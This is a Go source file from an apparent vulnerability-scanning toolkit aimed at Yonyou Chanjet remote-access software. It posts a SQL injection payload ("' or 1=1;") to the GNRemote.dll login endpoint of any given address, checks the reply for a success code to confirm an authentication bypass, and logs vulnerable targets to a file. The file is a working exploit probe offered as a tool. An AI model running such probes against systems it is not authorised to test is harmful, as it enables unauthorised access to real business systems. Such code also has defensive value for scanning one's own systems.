package Scan

import (
	"FoPoForYonyou2.0/Utils"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func GNRemoteScan(address string, client *http.Client, Red string, Green string, Yellow string, Reset string, Cyan string, currentTime string) {
	GNRemote := "用友 畅捷通远程通 GNRemote.dll SQL注入漏洞"
	urls := address + "/GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl"
	response, _ := client.Post(urls, "application/x-www-form-urlencoded", strings.NewReader("username=%22'%20or%201%3d1%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1"))
	defer response.Body.Close()

	// 读取响应内容
	body, _ := ioutil.ReadAll(response.Body)

	if strings.Contains(string(body), "{\"RetCode\":0}") {
		result := GNRemote + "：" + urls
		//保存文件不能用传来的currentTime，得重新定义一个格式的时间戳
		timestamp := time.Now().Format("20230712")
		filename := fmt.Sprintf("scan_result_%s.txt", timestamp)
		err := Utils.SaveResultToFile(result, filename)
		if err != nil {
			log.Println("保存结果到文件出错:", err)
		} else {

		}
		output := fmt.Sprintf("["+Green+"%s"+Reset+"] ["+Green+"+"+Reset+"] 存在%s：%s", currentTime, GNRemote, urls)
		fmt.Println(output)
	} else {
		output := fmt.Sprintf("["+Cyan+"%s"+Reset+"] ["+Yellow+"-"+Reset+"] 不存在%s ", currentTime, GNRemote)
		fmt.Println(output)
	}
}
